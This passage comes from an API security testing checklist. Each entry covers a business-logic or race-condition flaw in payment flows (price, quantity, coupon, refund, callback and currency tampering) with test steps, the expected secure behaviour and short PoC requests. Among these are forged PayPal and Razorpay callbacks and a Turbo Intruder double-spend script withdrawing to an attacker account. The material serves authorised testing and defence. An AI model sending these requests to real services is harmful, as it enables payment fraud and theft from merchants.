**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Update Resource — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Update product price to negative<br>2. Set price to 0.01<br>3. Check validation

**Expected Result:** Should validate business rules

**Payload / PoC Example:**

```
PUT /products/1 {"price": -100}
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0311 — Price Manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Intercept payment request<br>2. Modify price to lower value<br>3. Complete transaction

**Expected Result:** Should validate price server-side

**Payload / PoC Example:**

```
POST /checkout {"amount":0.01} (actual price $100)
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0312 — Negative Quantity
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Set quantity to negative number<br>2. Submit order<br>3. Check if receives credit

**Expected Result:** Should validate quantity &gt; 0

**Payload / PoC Example:**

```
POST /order {"quantity":-5, "productId":1}
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0313 — Coupon Code Reuse
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Apply single-use coupon<br>2. Complete order<br>3. Try reusing same coupon

**Expected Result:** Should invalidate used coupons

**Payload / PoC Example:**

```
Reuse coupon code multiple times
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0314 — Payment Callback Spoofing
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Intercept payment gateway callback<br>2. Forge success response<br>3. Check if order approved

**Expected Result:** Should validate callback signature/authenticity

**Payload / PoC Example:**

```
Send fake payment success callback
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0315 — Refund Manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Request refund<br>2. Modify refund amount<br>3. Check if higher amount refunded

**Expected Result:** Should validate refund amount against original

**Payload / PoC Example:**

```
POST /refund {"transactionId":1, "amount":999}
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0316 — Integer Overflow in Amount
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Submit extremely large amount<br>2. Check if overflows to negative<br>3. Test limits

**Expected Result:** Should validate amount ranges

**Payload / PoC Example:**

```
amount: 2147483647 + 1 = -2147483648
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0317 — Transaction Replay Attack
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Capture successful payment request<br>2. Replay same request<br>3. Check if duplicates

**Expected Result:** Should implement idempotency keys

**Payload / PoC Example:**

```
Replay identical payment request
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0318 — Discount Stacking Abuse
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Apply multiple discount codes<br>2. Stack loyalty points with coupons<br>3. Check total discount calculation

**Expected Result:** Should limit stackable discounts

**Payload / PoC Example:**

```
Apply multiple 50% discounts to get free item
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0319 — Gift Card Balance Manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Create gift card<br>2. Attempt to modify balance<br>3. Use card with inflated balance

**Expected Result:** Should validate gift card balance server-side

**Payload / PoC Example:**

```
Modify gift card balance in request
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0320 — Floating Point Precision Exploit
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Use amounts like 0.1 + 0.2 that cause float errors<br>2. Purchase items at exploitable price boundaries<br>3. Trigger rounding errors for monetary gain

**Expected Result:** Monetary values use decimal/fixed-point arithmetic; not float

**Payload / PoC Example:**

```
POST /checkout {"amount":0.10000000000000001}
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite, Python

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0321 — Buy Now Pay Later / Installment Bypass
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Set up installment payment plan<br>2. Receive goods on first installment<br>3. Cancel subscription after first payment<br>4. Verify server-side enforcement

**Expected Result:** Access to goods/services tied to payment completion; automated checks

**Payload / PoC Example:**

```
Cancel subscription after first payment, attempt to retain product access
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Manual testing

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0322 — Workflow Bypass - Skip Steps
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Complete normal multi-step flow<br><br>2. Identify required steps<br><br>3. Skip intermediate steps<br><br>4. Check if final step succeeds

**Expected Result:** Should validate all prerequisite steps

**Payload / PoC Example:**

```
Skip payment go directly to confirmation
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0323 — Workflow Bypass - Replay Steps
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Complete normal flow<br><br>2. Replay earlier step after completion<br><br>3. Check for state inconsistency<br><br>4. Exploit replayed actions

**Expected Result:** Should invalidate completed steps

**Payload / PoC Example:**

```
Replay payment confirmation multiple times
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0324 — Negative Value Manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Find numeric input fields<br><br>2. Submit negative values<br><br>3. Check if validation exists<br><br>4. Exploit negative quantity/price

**Expected Result:** Should validate numeric ranges server-side

**Payload / PoC Example:**

```
quantity=-5 or price=-100
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0325 — Free Premium Feature Access
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Identify premium features<br><br>2. Access feature endpoints directly<br><br>3. Bypass payment/subscription checks<br><br>4. Access without authorization

**Expected Result:** Should validate subscription status for premium features

**Payload / PoC Example:**

```
Access /api/premium-feature without subscription
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0326 — Referral/Bonus Abuse
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Create multiple accounts<br><br>2. Self-refer using different accounts<br><br>3. Claim referral bonuses<br><br>4. Check for abuse prevention

**Expected Result:** Should detect self-referral patterns

**Payload / PoC Example:**

```
Self-referral to earn unlimited bonuses
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0327 — Trial Period Abuse
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Complete trial period<br><br>2. Create new account with same details<br><br>3. Restart trial<br><br>4. Check for trial abuse prevention

**Expected Result:** Should track trial usage across accounts

**Payload / PoC Example:**

```
Unlimited trials with new email addresses
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0328 — Time-Based Bypass
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Identify time-restricted features<br><br>2. Manipulate client clock<br><br>3. Modify time-related parameters<br><br>4. Bypass time restrictions

**Expected Result:** Should validate time server-side

**Payload / PoC Example:**

```
Access sale-price after sale ends via time manipulation
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0329 — Payment Callback Manipulation
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Payment/Transaction — Business-flow params (price/qty/coupon/state)

**Test Steps:** 1. Initiate payment with real gateway<br>2. Intercept callback from payment provider to server<br>3. Forge callback with status=success<br>4. Try modifying amount, currency, transaction ID

**Expected Result:** Callback signature/HMAC verified; amount and order validated server-side against DB

**Payload / PoC Example:**

```
# Fake payment success callback
POST /api/payment/callback HTTP/1.1
{"status": "success", "transaction_id": "TXN-REAL", "amount": 0.01, "order_id": "ORD-9999"}

# PayPal IPN spoof
POST /api/paypal/ipn
payment_status=Completed&receiver_email=seller@target.com&payment_amount=1000.00&item_number=TARGET_ORDER

# Razorpay signature bypass  
POST /api/razorpay/callback
{"razorpay_payment_id":"pay_fake","razorpay_order_id":"order_real","razorpay_signature":"<forged_hmac>"}

# Modify amount in callback
{"status":"AUTHORIZED","amount":"0.01","original_amount":"999.99","order_id":"ORD-999"}

# Currency swap
{"status":"COMPLETED","amount":"1000","currency":"IDR"}  # 1000 IDR ≈ $0.06 USD
```

**Impact:** Workflow/flow abuse causing financial or state manipulation

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0330 — Sensitive business-flow abuse: scalping / hoarding / bulk redemption (API6)
**Phase:** 8-Business Logic · **Category:** Business Logic · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** High-value flow (checkout / coupon / referral / limited stock)

**Test Steps:** 1. Identify a sensitive business flow with real-world value<br>2. Script it faster/more often than a human (a few iterations to prove no anti-automation)<br>3. Combine with parallelism (race) for limit-overrun<br>4. Quantify units acquired / value extracted

**Expected Result:** Flow has anti-automation (rate/complexity/CAPTCHA/limits) proportional to its value

**Payload / PoC Example:**

```
for i in 1..10: POST /api/v1/coupon/redeem {"code":"WELCOME10"}   (also fire in parallel)
```

**Impact:** Unrestricted business-flow access -&gt; scalping, coupon abuse, inventory denial -&gt; financial loss

**Tools:** Burp Intruder, Turbo Intruder (parallel), curl

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); PortSwigger Business logic vulnerabilities; OWASP API6; REST_API ARSENAL §9; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0331 — Race condition: double spending or coupon reuse
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Capture withdraw / redeem coupon request<br>2. Use Turbo Intruder single-packet (gate sync) to fire 20 in parallel<br>3. Check whether duplicate succeeded

**Expected Result:** Use DB transactions / row locks; idempotency keys

**Payload / PoC Example:**

```
Single-packet attack 20x
```

**Impact:** Direct financial loss

**Tools:** Turbo Intruder,Burp 2023.10

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0332 — Race Condition in Profile Update
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Profile Update — Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Send simultaneous profile updates<br>2. Use threading/async requests<br>3. Check final state

**Expected Result:** Should handle concurrency properly

**Payload / PoC Example:**

```
Send 10 simultaneous requests with different data
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0333 — Race Condition on Update
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Update Resource — Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Send simultaneous update requests<br>2. Use different values<br>3. Check final state

**Expected Result:** Should handle concurrency with locks/transactions

**Payload / PoC Example:**

```
Send 10 simultaneous PUTs with different data
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0334 — Race Condition - Double Spending
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Initiate payment with limited balance<br>2. Send simultaneous requests<br>3. Check if both succeed

**Expected Result:** Should use transaction locks

**Payload / PoC Example:**

```
Send 2 simultaneous $100 payments with only $100 balance
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0335 — Race Condition - Coupon Double Use
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Apply coupon code<br><br>2. Send multiple simultaneous requests<br><br>3. Check if coupon applied multiple times<br><br>4. Verify discount calculation

**Expected Result:** Should use atomic operations for coupon application

**Payload / PoC Example:**

```
10 concurrent POST /api/apply-coupon
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0336 — Race Condition - Balance Manipulation
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Check account balance<br><br>2. Initiate multiple simultaneous withdrawals<br><br>3. Total withdrawals exceed balance<br><br>4. Check for negative balance or overdraft

**Expected Result:** Should lock balance during transaction

**Payload / PoC Example:**

```
10 concurrent POST /api/withdraw with full balance
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0337 — Race Condition - Inventory Bypass
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Add last item to cart<br><br>2. Send multiple purchase requests simultaneously<br><br>3. Check if all purchases succeed<br><br>4. Verify inventory went negative

**Expected Result:** Should lock inventory during purchase

**Payload / PoC Example:**

```
10 concurrent POST /api/purchase for last item
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0338 — Race Condition - Vote Manipulation
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Submit vote<br><br>2. Send multiple simultaneous vote requests<br><br>3. Check if multiple votes counted<br><br>4. Verify vote count consistency

**Expected Result:** Should implement idempotency for votes

**Payload / PoC Example:**

```
10 concurrent POST /api/vote
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0339 — Race Condition - Follow/Like Abuse
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Follow/like a resource<br><br>2. Send multiple simultaneous requests<br><br>3. Check if count inflated<br><br>4. Verify database consistency

**Expected Result:** Should use unique constraints and transactions

**Payload / PoC Example:**

```
10 concurrent POST /api/follow
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0340 — Race Condition Double-Spend Attack
**Phase:** 8-Business Logic · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Payment/Transaction — Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Find payment/withdrawal endpoint<br>2. Use Turbo Intruder to send 20+ simultaneous requests<br>3. Each request attempts to spend same balance<br>4. Check if multiple transactions succeed

**Expected Result:** Atomic database transactions with row-level locking; idempotency enforced

**Payload / PoC Example:**

```
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

# The request to race
POST /api/withdraw HTTP/1.1
Authorization: Bearer <token>
{"amount": 500, "to_account": "attacker_account"}

# Or coupon race condition
POST /api/apply-coupon {"code": "SAVE50"}  × 20 simultaneous

# Or gift card claim race
POST /api/claim-gift-card {"code": "GIFT-XXXX"}  × 15 simultaneous

# Monitor: check account balance after race
# Vulnerable: 20 × $500 = $10,000 withdrawn from $500 balance
```

**Impact:** TOCTOU race enabling limit bypass / double-spend

**Tools:** Turbo Intruder, Python asyncio

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0341 — Currency manipulation
**Phase:** 8-Business Logic · **Category:** Security Misconfiguration · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Change currency to lower-value (USD-&gt;VND)<br>2. Submit payment<br>3. Verify amount charged

**Expected Result:** Server enforces currency from product

**Payload / PoC Example:**

```
currency: USD -> VND
```

**Impact:** Severe financial loss

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0342 — Refund amount &gt; original purchase
